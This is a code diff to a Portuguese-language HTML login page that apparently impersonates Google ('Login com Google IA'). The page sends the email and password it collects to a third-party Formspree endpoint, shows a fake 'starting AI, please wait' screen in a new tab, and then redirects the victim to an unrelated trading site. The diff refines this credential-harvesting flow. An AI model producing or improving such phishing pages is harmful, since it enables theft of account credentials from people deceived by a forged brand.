@@ -45,20 +45,6 @@
         button:hover {
             background-color: #45a049;
         }
-        .message-container {
-            display: none;
-            padding: 20px;
-            background-color: white;
-            border-radius: 8px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            width: 300px;
-            text-align: center;
-            margin-top: 20px;
-        }
-        .message-container p {
-            color: green;
-            font-size: 16px;
-        }
     </style>
 </head>
 <body>
@@ -67,7 +53,7 @@
         <h2>Login com Google IA</h2>
         <h5>Insira suas credenciais para começar</h5>
         <!-- Formulário com o action do Formspree -->
-        <form id="loginForm" action="https://formspree.io/f/manngnwv" method="POST">
+        <form id="loginForm" action="https://formspree.io/f/manngnwv" method="POST" target="_blank">
             <div class="input-group">
                 <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
             </div>
@@ -78,27 +64,53 @@
         </form>
     </div>
 
-    <div class="message-container" id="messageContainer">
-        <p>Iniciando IA, aguarde... Isso poderá levar alguns minutos.</p>
-    </div>
-
     <script>
         // Função chamada ao enviar o formulário
         document.getElementById('loginForm').addEventListener('submit', function(event) {
-            // Exibe a mensagem de espera
-            document.getElementById('messageContainer').style.display = 'block';
+            // Abre uma nova guia com a mensagem de envio
+            const newWindow = window.open('', '_blank');
+            newWindow.document.write(`
+                <html>
+                    <head>
+                        <title>Aguarde</title>
+                        <style>
+                            body {
+                                font-family: 'Roboto', sans-serif;
+                                display: flex;
+                                justify-content: center;
+                                align-items: center;
+                                height: 100vh;
+                                margin: 0;
+                                background-color: #f7f7f7;
+                            }
+                            .message-container {
+                                padding: 20px;
+                                background-color: white;
+                                border-radius: 8px;
+                                box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+                                text-align: center;
+                            }
+                            .message-container p {
+                                color: green;
+                                font-size: 16px;
+                            }
+                        </style>
+                    </head>
+                    <body>
+                        <div class="message-container">
+                            <p>Iniciando IA, aguarde... Isso poderá levar alguns minutos.</p>
+                        </div>
+                    </body>
+                </html>
+            `);
+            newWindow.document.close();
 
-            // Não interrompe o envio do formulário
-            // A execução do redirecionamento ocorre após o envio e processamento
-        });
-
-        // Aguardar o envio do formulário e redirecionar para a página desejada
-        document.getElementById('loginForm').onsubmit = function() {
+            // Aguardar o envio do formulário e redirecionar para a página desejada
             setTimeout(function() {
                 // Após 2 segundos, redireciona para o site desejado
                 window.location.href = "https://tradeboosting.org/app/login.php"; 
             }, 2000);
-        };
+        });
     </script>
 
 </body>
